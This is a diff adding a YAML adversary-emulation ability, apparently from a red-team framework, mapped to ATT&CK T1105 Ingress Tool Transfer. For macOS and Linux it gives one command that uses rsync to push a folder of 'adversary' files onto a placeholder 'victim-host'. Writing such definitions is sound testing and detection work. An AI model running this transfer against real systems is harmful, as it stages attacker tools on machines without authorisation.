@@ -1,0 +1,20 @@
+- description: 'Utilize rsync to perform a remote file copy (push)
+
+    '
+  id: 866227c57aaeb1e0e9d761e15fc29e44
+  name: rsync remote file copy (push)
+  platforms:
+    darwin:
+      sh:
+        cleanup: ''
+        command: rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files
+        payloads: []
+    linux:
+      sh:
+        cleanup: ''
+        command: rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files
+        payloads: []
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
